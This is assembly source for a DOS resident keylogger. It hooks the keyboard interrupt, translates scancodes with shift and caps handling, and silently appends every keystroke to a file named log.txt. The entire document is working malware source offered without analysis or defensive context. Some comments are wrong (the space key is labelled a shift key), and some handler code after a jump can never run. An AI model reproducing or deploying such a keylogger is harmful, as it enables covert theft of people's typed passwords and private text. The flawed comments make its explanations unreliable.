.model small
.stack 1000
.data    
    old_2fh dd 0
    old_09h dd 0
    resident_program_message db 'Program is resident!', '$'   
    already_resident_program_message db 'Program is already resident!', '$'
.code
.386
    scancode db ?
    char db ?
    
    filename db 'log.txt',0
    shift_flag db 0
    caps_flag db 0  
    
    ASCIITableL db '*', '*', "1234567890-=", '*', 09h
                db "qwertyuiop[]", 0Dh, '*' 
                db "asdfghjkl;'`", '*', "\zxcvbnm,./"
                db '*', '*', ' ', 20h
                
    ASCIITableU db '*', '*', "!@#$%^&*()_+", '*', 09h
                db "QWERTYUIOP{}", '*', '*' 
                db 'ASDFGHJKL:"~', '*', "|ZXCVBNM<>?" 
                db '*', '*', ' ', 20h           
    
    asc_count equ 39h
    
Exit proc
    mov ax,4C00h
    int 21h
    ret
Exit endp

OutputString macro str
    mov ah, 09h
    mov dx, offset str
    int 21h
endm

New_2fh proc
    cmp ah, 0f1h ;check multiplex. int. function number
    jne out_2fh ;not f1h -> out
    cmp al, 00h ;try to repeat installation?
    je inst ;tell it's restricted
    
    jmp short out_2fh ;function is undefined -> out
inst:  
    mov al, 0ffh ;program is already resident
    iret
out_2fh:
    jmp dword ptr ds:old_2fh
    iret 
New_2fh endp

New_09h proc        
    push ds si es di dx cx bx ax  
    
    xor ax, ax 
    in  al, 60h ;load data from port 60h to register             
    call getASCII ;get scancode
    mov char, al
    cmp char, 0
    je OldHandler       
    
;---- put char into file -----;         
    push cs ;make ds point to cs
    pop ds
    
    mov ah,3Dh ;open file
    mov al,1 ;write mode
    mov dx,offset filename ;DS:DX 
    int 21h
    jnc writeChar    
    
noFile:
; failed -> try to create file
    mov ah, 5Bh
    mov cx, 0
    lea dx, filename 
    int 21h
    jc OldHandler ;failed again -> proceed  
    
WriteChar:            
    mov bx, ax ;df to bx
    
    xor cx, cx                
    xor dx, dx                
    mov ax, 4202h ;set fp to end of file
    int 21h   
    
    mov ah, 40h ;write
    mov cl, 1         
    mov dx, offset char      
    int 21h  
    
    mov ah, 3Eh ;close file
    int 21h
        
OldHandler: 
    pop ax bx cx dx di es si ds                       
    jmp dword ptr cs:old_09h ;call default handler
    xor ax, ax
    mov al, 20h 
    out 20h, al ;data output to port 20h
    call Exit
            
EndInt_09h:
    xor ax, ax
    mov al, 20h
    out 20h, al ;data output to port 20h
     
    pop ax bx cx dx di es si ds 
    iret
New_09h endp

GetASCII proc
;check if special keys were pressed
    cmp al, 2Ah     ;left shift?
    je ShiftPressed
    cmp al, 39h     ;right shift?
    je ShiftPressed 
    cmp al, 3Ah     ;left shift?
    je CapsPressed    
;check if special keys were released    
    sub al, 80h
    cmp al, 2Ah     ;left shift?
    je ResetShift
    cmp al, 39h     ;right shift?
    je ResetShift 
    cmp al, 3Ah     ;left shift?
    je CapsPressed             
    
;if special keys weren't the case
; + we don't handle other keys releases
    add al, 80h      
    cmp al, 80h
    ja FlagsHandled
;decide if lower case or higher case is required    
    cmp caps_flag, 0
    jne CapsNotActive
    cmp shift_flag, 0
    je LowCase
    jmp UpCase 
    
CapsNotActive:
    cmp shift_flag, 1
    je LowCase
    jmp UpCase    
    
ShiftPressed:
    mov shift_flag, 1
    jmp CheckSpace 
    
ResetShift:
    mov shift_flag, 0
    jmp CheckSpace
     
CapsPressed:
    cmp caps_flag, 0
    jne ResetCaps
    mov caps_flag, 1
    jmp CheckSpace 
    
ResetCaps:
    mov caps_flag, 0
    jmp CheckSpace    
    
LowCase:    
    lea di, ASCIITableL
    xor cx, cx                    
    cmp al, asc_count
    ja notChar
    jmp skip
    
UpCase:    
    lea di, ASCIITableU
    xor cx, cx     
    cmp al, asc_count
    ja notChar    
    
Skip:
    cmp cl, al
    jae get
    inc di
    add cl, 1
    jmp skip 
     
Get:
    mov al, cs:[di]
    jmp GetASCII_end    
NotChar:
    mov al, '*'
    jmp GetASCII_end
    
CheckSpace:
    cmp al, 39h
    jne FlagsHandled
    mov al, ' '
    ret
FlagsHandled:
    xor ax, ax
GetASCII_end:        
    ret
getASCII endp

start:
    mov ax, @data
    mov ds, ax
    ;mov es, ax
    
    mov ah,0f1h ;check if program is already resident
    mov al,0          
    int 2fh
    cmp al,0ffh ;if it's resident - exit
    jne IsNotResidentNow
    
    OutputString already_resident_program_message
    jmp _end 
    
IsNotResidentNow:
    OutputString resident_program_message
    
    cli ;disallow interruptions
  
    pushf ;store the FLAGS register on the stack
    push 0 ;send 0 to ds
    pop ds
    mov eax, ds:[2fh*4] 
    mov cs:[old_2fh], eax ;save default handler
    
    mov ax, cs
    shl eax, 16 ;left shift
    mov ax, offset New_2fh
    mov ds:[2fh*4], eax ;set new handler
    
    pushf 
    push 0 ;send 0 to ds
    pop ds
    mov eax, ds:[09h*4] 
    mov cs:[old_09h], eax ;save default handler
    
    mov ax, cs
    shl eax, 16
    mov ax, offset New_09h
    mov ds:[09h*4], eax ;set new handler  
    
    sti ;allow interruptions  
    
    xor ax, ax
    mov ah, 31h ;leave the program resident    
    ;resident size in paragraphs (16 bytes)
    mov dx, (start - @code + 10Fh) / 16       
    int 21h
    
_end:
    call Exit  
end start